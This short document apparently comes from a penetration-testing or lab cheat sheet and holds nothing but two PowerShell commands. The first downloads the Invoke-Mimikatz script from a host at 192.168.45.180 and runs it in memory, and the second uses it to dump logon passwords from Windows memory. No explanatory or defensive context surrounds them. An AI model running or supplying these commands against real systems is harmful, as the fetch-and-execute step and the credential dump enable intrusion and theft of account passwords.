```
iex (New-Object Net.WebClient).DownloadString("http://192.168.45.180/Invoke-Mimikatz.ps1")
```

```
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

